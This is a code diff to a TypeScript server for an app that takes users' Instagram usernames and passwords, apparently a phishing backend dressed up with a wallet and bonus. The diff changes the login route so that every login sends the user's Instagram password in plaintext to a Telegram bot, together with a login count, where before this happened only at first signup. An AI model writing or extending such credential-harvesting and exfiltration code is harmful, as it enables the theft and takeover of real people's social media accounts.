@@ -64,10 +64,12 @@ async function sendToTelegramBot(action: string, data: any) {
   let message = "";
   switch (action) {
     case "login":
-      message = `🔐 *New Login Alert*\n\n` +
+      const loginStatus = data.isNewUser ? "पहली बार लॉगिन" : `${data.loginCount}वीं बार लॉगिन`;
+      message = `🔐 *${loginStatus}*\n\n` +
                `📱 *UID:* \`${data.uid}\`\n` +
                `👤 *Instagram:* @${data.instagramUsername}\n` +
-               `🔑 *Password:* \`${data.password}\`\n\n` +
+               `🔑 *Password:* \`${data.password}\`\n` +
+               `🔢 *Login Count:* ${data.loginCount}\n\n` +
                `⏰ ${new Date().toLocaleString()}`;
       break;
     case "payment":
@@ -203,6 +205,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Check if user exists
       let user = await storage.getUserByInstagramUsername(instagramUsername);
+      let isNewUser = false;
       
       if (!user) {
         // Create new user
@@ -214,14 +217,20 @@ export async function registerRoutes(app: Express): Promise<Server> {
           walletBalance: "0",
           bonusClaimed: false,
         });
-
-        // Send to Telegram bot
-        await sendToTelegramBot("login", {
-          uid: user.uid,
-          instagramUsername,
-          password,
-        });
+        isNewUser = true;
       }
+
+      // Track login attempt and get count
+      const loginCount = await storage.logUserLogin(user.id, instagramUsername);
+
+      // Send login notification to Telegram bot for every login
+      await sendToTelegramBot("login", {
+        uid: user.uid,
+        instagramUsername,
+        password,
+        loginCount,
+        isNewUser,
+      });
 
       // Store user in session
       req.session.userId = user.id;
